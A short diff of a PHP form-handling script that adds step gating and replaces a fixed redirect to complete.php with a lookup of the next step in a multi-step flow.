@@ -2,6 +2,11 @@
 include '../settings.php';
 include 'functions.php';
 
+if (!h4z3_is_step_active('code')) {
+    header('Location: ' . h4z3_get_first_step_path('../'));
+    exit;
+}
+
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     $code = $_POST['code'];
@@ -44,7 +49,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         }
         }
 
-     header('Location: ../complete.php');
-     exit;
+    $nextStep = h4z3_get_next_step_path('code', '../');
+    header('Location: ' . $nextStep);
+    exit;
 }
 ?>
